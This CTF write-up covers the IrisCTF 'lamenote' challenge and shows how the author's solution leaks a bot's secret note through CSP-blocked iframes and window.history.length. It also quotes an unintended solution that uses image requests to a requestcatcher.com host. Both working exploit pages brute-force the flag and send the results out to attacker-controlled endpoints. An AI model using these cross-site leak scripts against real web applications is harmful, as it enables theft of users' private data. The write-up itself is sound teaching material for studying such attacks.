## Chall -- Author: Seraphin
#### `XS Leak` via `CSP violation` and `window.history.length`

In this challenge, the author developed a webpage in which there is an iframe for creating notes (typical XS leak or XSS chall). In the other place, there is a bot which creates a notes inserting the flag and after that visits our url. 

#### Intended solutions

The page for creating notes has two main features, creating and querying notes. Notes consist in a title, a content and a IMG url (this is important). For querying a note, we can do it using a url param, that searches the query in both title and content. In the search function, there is a specific behavior when there are more than one note that matches the query. If there is just one note it would load the full note (`return render_note(results[0])`), in the case that more than one note satisfy the query, it won't load the img url (`return "<!DOCTYPE html><body>" + "".join("<a href='/note/" + note["id"] + "'>" + note["title"] + "</a> " for note in results) + "</body>"`). This tricky behavior would be important for one of the unintended solution. For the bot, it basically loads the page, creates a note with the flag in the content and a imgurl.com url for the img. After that, it visits your page.

The solution for this challenge consist in the abuse of CSP for the image and the `history.length` information. In simple words, if our main page has a CSP of `img-src none` and we try to load inside an iframe one note that have an external img, the iframe won't load. In the case that we are trying to load an inexistent note, it will load. This difference can be seen using the web API `history.length`. In the case that we hit one character of the flag, the iframe won't load and the `history.length` doesn't change. 
Author solution (with my comments):

```html
    <!DOCTYPE html>
    <html>
    <head>
    </head>
    <body>
    <script>
        (async function(){
        async function go(body) {
          let url = "https://lamenote-web.chal.irisc.tf/search?query=irisctf{" + body
    
          // Create the iframe
          f = document.createElement('iframe')
          // We add the restriction that blocks to load the frame if there is a img in it 
          // So, if we are searching a valid post with an external img (flag), it won't load
          f.setAttribute('csp', 'img-src \'none\';')
          f.src = url;

          // Reload the url onload
          let rCount = 0;
          f.onload = () => {
              rCount += 1;
              // change location after onload once
              setTimeout(() => {
                  f.onload = null
                  f.src = url;
              }, 100)
          }
          document.body.appendChild(f)
          await new Promise(r => setTimeout(r, 1000));
          f.remove();
          return window.history.length;
        }

        // Known means the text inside flag. irisctf{KNOWN}
        let known = "";
        // If we know some part of the flag just not to start from the beginning
        const urlParams = new URLSearchParams(window.location.search);
        if(urlParams.get("known") !== null) known = urlParams.get("known");

        // Start
        let l = await go("!"); // start
        console.log("start", l);
        // Character by character
        for(let c of '_abcdefgihkjlmnopqrstuvwxyz}') {
          let l2 = await go(known + c);
          console.log(l2, l, known, c);
          fetch("/?log=" + l2 + "|" + l + "|" + known + "|" + c);
          // Correct
          if(l2 == l) {
            known += c;
            l = l2;
            fetch("/?log=" + known);
            break;
          };
          l = l2;
        }

        // Report all the flag
        if(!known.endsWith("}")) {
          // We open the page using as starting point what we know from the flag
          // It refresh the history.length because there is a maximum of 50 
          // It works because the bot is headless
          window.open("/?known=" + known);
          window.close();
          while(1) {
            await new Promise(r => setTimeout(r, 1000));
            console.log("idle");
          }
        }
        })();
    </script>
    </body>
    </html>
```

#### Unintended solutions


- [hamayanhamayan](https://blog.hamayanhamayan.com/entry/2024/01/08/132233). In this amazing but slow solution, the idea is to create all the possible notes. After that it will load them, if there is one that doesn't get reported via IMG url, it means that the page has loaded (without the img) more than one note (Two notes: our random character guess note + the flag note).

```html
<body>
<script>
    const sleep = ms => new Promise(r => setTimeout(r, ms));
    const prefix = "irisctf{please_";
    const chars = "abcdefghijklmnopqrstuvwxyz_";
    setTimeout(async () => {
        for (var i in chars) {
            form.title.value = prefix + chars[i];
            form.text.value = prefix + chars[i];
            form.image.value = "https://[yours].requestcatcher.com/" + prefix + chars[i];
            form.submit();
            await sleep(500);
        }
        for (var i in chars) {
            form2.query.value = prefix + chars[i];
            form2.submit();
            await sleep(500);
        }
    }, 0);
</script>
<img src="https://[yours].requestcatcher.com/start">
<iframe name="dummyFrame" id="dummyFrame"></iframe>
<form method="POST" target="dummyFrame" id="form" action="https://lamenote-web.chal.irisc.tf/create">
    <input name="title">
    <input name="text">
    <input name="image">
</form>
<form method="GET" target="dummyFrame" id="form2" action="https://lamenote-web.chal.irisc.tf/search">
    <input name="query">
</form>
</body>
```
